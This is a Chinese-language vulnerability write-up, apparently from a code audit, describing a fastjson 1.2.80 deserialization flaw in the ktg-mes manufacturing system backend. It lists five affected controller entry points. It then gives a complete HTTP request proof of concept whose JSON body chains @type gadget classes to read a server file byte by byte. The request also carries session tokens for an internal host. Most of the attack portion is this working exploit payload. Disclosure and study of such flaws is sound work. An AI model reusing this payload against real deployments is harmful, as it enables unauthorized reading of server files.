## ktg-mes 后台存在 fastjson 反序列化漏洞

fastjson 版本 1.2.80：

![image-20250905151032217](./images/image-20250905151032217.png)

com.ktg.generator.controller.GenController#editSave：

![image-20250905151103768](./images/image-20250905151103768.png)

com.ktg.generator.service.IGenTableService#validateEdit：

![image-20250905151119637](./images/image-20250905151119637.png)

类似漏洞入口点总结：

com.ktg.generator.controller.GenController#editSave

com.ktg.mes.wm.controller.mobile.WmStockTakingMobController#add

com.ktg.mes.wm.controller.mobile.WmStockTakingMobController#edit

com.ktg.mes.wm.controller.WmStockTakingController#add

com.ktg.mes.wm.controller.WmStockTakingController#edit

单字节读文件 poc：

```javap
PUT /dev-api/tool/gen HTTP/1.1
Host: 10.157.131.188
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: Admin-Token=eyJhbGciOiJIUzUxMiJ9.eyJsb2dpbl91c2VyX2tleSI6Ijc4YzVmYjlkLTQ1MzMtNGEwZC04NTQyLTBhZTQ0YmQ5ZjY2NSJ9.hR1uO_MHvDBheqcoD3X8joZTEPq2PD92iZWCV6u5_MHQGdnkf7mpYHTCJrg9CelTPuRMh50AAIOlUJUmVD_rcA
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
Accept: application/json, text/plain, */*
Authorization: Bearer eyJhbGciOiJIUzUxMiJ9.eyJsb2dpbl91c2VyX2tleSI6Ijc4YzVmYjlkLTQ1MzMtNGEwZC04NTQyLTBhZTQ0YmQ5ZjY2NSJ9.hR1uO_MHvDBheqcoD3X8joZTEPq2PD92iZWCV6u5_MHQGdnkf7mpYHTCJrg9CelTPuRMh50AAIOlUJUmVD_rcA
Referer: http://10.157.131.188/tool/gen
Content-Type: application/json

{
    "aaa":"test","tableName":"1","tableComment":"2","className":"3","packageName":"4","moduleName":"5","businessName":"6","functionName":"7","functionAuthor":"8","tplCategory":"tree",
    "params":{
        "a": "{\"@type\": \"java.lang.Exception\",\"@type\": \"com.fasterxml.jackson.core.exc.InputCoercionException\",    \"p\": {    }  }",
        "b": {
          "$ref": "$.a.a"
        },
        "c": "{  \"@type\": \"com.fasterxml.jackson.core.JsonParser\",  \"@type\": \"com.fasterxml.jackson.core.json.UTF8StreamJsonParser\",  \"in\": {}}",
        "d": {
            "$ref": "$.c.c"
        },
        "abc":{
            "@type":"java.io.InputStream",
            "@type":"org.apache.commons.io.input.BOMInputStream",
            "delegate":{
                "@type":"org.apache.commons.io.input.ReaderInputStream",
                "reader":{
                    "@type":"jdk.nashorn.api.scripting.URLReader",
                    "url":"file://D:/CodeAudit/ktg-mes-master/ktg-mes-master/test.txt"
                },
                "charsetname":"UTF-8",
                "buffersize":1024
            },
            "boms":[{
                "@type":"org.apache.commons.io.ByteOrderMark",
                "charsetname":"UTF-8",
                "bytes":[115]
            }],
            "address":{"$ref":"$.abc.BOM"}
        }
    }
}
```

![image-20250905151142780](./images/image-20250905151142780.png)